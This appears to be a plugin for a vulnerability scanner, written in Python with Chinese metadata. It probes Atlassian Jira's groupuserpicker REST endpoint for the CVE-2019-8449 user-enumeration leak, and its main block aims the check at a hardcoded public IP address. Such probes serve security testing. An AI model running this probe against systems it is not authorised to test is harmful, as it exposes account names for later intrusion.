#!/usr/bin/env python
#coding:utf-8
import requests

def get_plugin_info():
    plugin_info = {
        "info": "Atlassian Jira 用户名枚举漏洞（CVE-2019-8449），影响范围 Atlassian Jira 7.12< 受影响版本<8.4.0",
        "source": 1,
        "name": "Jira用户名枚举漏洞(CVE-2019-8449)",
        "keyword": "server:web",
        "level": "中危",
        "url": "https://www.cvedetails.com/cve/CVE-2019-8449/",
        "author": "zinc",
        "type": "信息泄露"
    }
    return plugin_info


def check(host, port, timeout):

    target = 'http://%s:%d' % (host, port)
    header = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36',
    }

    url = target + '/rest/api/latest/groupuserpicker?query=admin&maxResults=50&showAvatar=false'
    r = requests.get(url, headers=header)
    if r.status_code == 200 and '匹配的用户' in r.content:
        #print u'信息泄露'
        return u'信息泄露'

if __name__ == '__main__':
    check('101.89.80.141', 8080, 3)